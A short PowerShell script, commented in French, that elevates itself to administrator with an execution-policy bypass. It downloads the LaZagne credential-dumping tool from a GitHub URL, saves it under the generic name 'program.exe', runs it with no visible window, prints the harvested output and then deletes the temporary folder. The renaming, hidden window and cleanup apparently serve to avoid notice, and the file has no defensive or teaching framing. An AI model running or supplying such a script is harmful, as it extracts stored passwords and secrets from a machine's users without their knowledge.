# URL de l'exécutable
$url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"


try {
    # Vérification des droits d'administrateur
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "Élévation des privilèges nécessaire..."
        # Relance le script avec des droits admin
        Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Wait
        exit
    }

    # Utilisation d'un dossier temporaire avec des droits d'accès complets
    $tempDir = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString())
    New-Item -ItemType Directory -Path $tempDir | Out-Null
    $tempExePath = Join-Path $tempDir "program.exe"

    Write-Host "Téléchargement de l'exécutable..."
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $tempExePath)

    # Attribution des permissions complètes
    $acl = Get-Acl $tempExePath
    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
        "FullControl",
        "Allow"
    )
    $acl.SetAccessRule($accessRule)
    Set-Acl $tempExePath $acl

    Write-Host "Lancement de l'exécutable..."
    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processStartInfo.FileName = $tempExePath
    $processStartInfo.UseShellExecute = $false
    $processStartInfo.RedirectStandardOutput = $true
    $processStartInfo.RedirectStandardError = $true
    $processStartInfo.CreateNoWindow = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processStartInfo
    $process.Start() | Out-Null
    
    $output = $process.StandardOutput.ReadToEnd()
    $error_output = $process.StandardError.ReadToEnd()
    $process.WaitForExit()

    if ($process.ExitCode -eq 0) {
        Write-Host "Exécution terminée avec succès."
        if ($output) { Write-Host "Sortie : $output" }
    } else {
        Write-Host "Erreur lors de l'exécution. Code de sortie : $($process.ExitCode)"
        if ($error_output) { Write-Host "Erreur : $error_output" }
    }
}
catch {
    Write-Host "Erreur : $_"
    Write-Host $_.Exception.Message
    Write-Host $_.ScriptStackTrace
}
finally {
    # Nettoyage
    if ($webClient) { $webClient.Dispose() }
    if (Test-Path $tempDir) {
        Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
    }
}
